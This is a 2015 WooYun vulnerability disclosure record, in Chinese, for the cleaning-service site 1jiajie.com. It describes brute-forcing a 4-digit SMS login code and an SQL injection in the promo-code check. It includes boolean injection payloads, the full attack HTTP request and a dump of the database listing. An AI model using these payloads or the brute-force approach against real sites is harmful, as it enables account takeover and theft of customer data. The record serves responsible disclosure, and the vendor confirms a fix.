{"id": 68770, "wybug_id": "wooyun-2015-0140366", "wybug_title": "e家洁多处漏洞打包（任意用户登录/SQL注入/全站所有数据）", "wybug_corp": "1jiajie.com", "wybug_author": "wps2015", "wybug_date": "2015-09-11 11:56", "wybug_open_date": "2015-10-26 17:58", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-09-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-26：\t细节向公众公开  简要描述： 多处问题 详细说明：  0x1e家洁采用的是手机号+动态验证码登录的;http://www.1jiajie.com/login.html\n\n但是验证码只有4位数字，直接burp，2分钟就跑完了\n\n这里以13111111111的测试号\n\n0x2点击快速下单，填写一系列信息后，进行优惠码验证阶段\n\n这里任意输入df'，报错信息为null，但是任意输入df，显示验证码不存在\n\n为了确定是否存在注入，这里的优惠码必须为一个存在的，我网上找了个过期的:vs9bqy1j输入vs9bqy1j' and '1'='1  和vs9bqy1j' and '1'='2 ，返回错误不一样，那么确定有注入了\nPOST /ajaxCheckPromoCode.html HTTP/1.1Host: www.1jiajie.com/ajaxCheckPromoCode.htmlProxy-Connection: keep-aliveContent-Length: 53Accept: application/json, text/javascript, */*; q=0.01Origin: http://www.1jiajie.comX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.6 Safari/537.36Content-Type: application/x-www-form-urlencoded; charset=UTF-8Referer: http://www.1jiajie.com/quickorder.htmlAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Cookie: PHPSESSID=q17j7mr3rm5mec43o8mo5u20a7; city_code=131; Hm_lvt_8cb0dedf820ed19a12222e3b0858424a=1441897202; Hm_lpvt_8cb0dedf820ed19a12222e3b0858424a=1441897896telephone=1311111111&freeCode=vs9bqy1j*\n\n\n15库：\navailable databases [15]:[*] ameituan[*] college[*] external_sys[*] information_schema[*] mysql[*] performance_schema[*] sms_up[*] sq_ejiajie[*] sq_ejiajie_crm[*] sq_ejiajie_data[*] sq_ejiajie_data_v2[*] sq_ejiajie_sunshine[*] sq_ejiajie_test[*] sq_ejiajie_v2[*] sq_ejiajie_v2_test\n当前库206张表\n\n6万用户\n\n15万订单\n\n   漏洞证明：  \n\n   修复方案：  过滤   版权声明：转载请注明来源 wps2015@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-09-11 17:57 厂商回复： 感谢您，我已经修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}